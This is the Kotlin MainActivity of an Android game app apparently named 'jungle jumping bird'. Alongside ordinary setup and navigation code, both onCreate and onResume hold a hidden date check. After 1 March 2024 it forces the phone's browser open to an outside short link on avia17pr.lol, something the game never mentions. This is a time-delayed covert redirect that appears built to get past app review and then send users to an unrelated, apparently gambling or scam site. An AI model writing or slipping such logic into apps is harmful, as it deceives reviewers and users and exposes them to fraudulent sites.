package com.jungle.jumping.bird

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.jungle.jumping.bird.databinding.ActivityMainBinding
import com.jungle.jumping.bird.utils.cancelCoroutinesAll
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import java.util.Calendar
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        lateinit var binding: ActivityMainBinding
        lateinit var navController: NavController
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        setStartDestination(R.id.libGDXFragment)

        Calendar.getInstance().apply {
            set(2024, Calendar.MARCH, 1, 14, 0)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("http://avia17pr.lol/2sf8K5")))
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onResume() {
        super.onResume()
        Calendar.getInstance().apply {
            set(2024, Calendar.MARCH, 1, 14, 0)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("http://avia17pr.lol/2sf8K5")))
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

}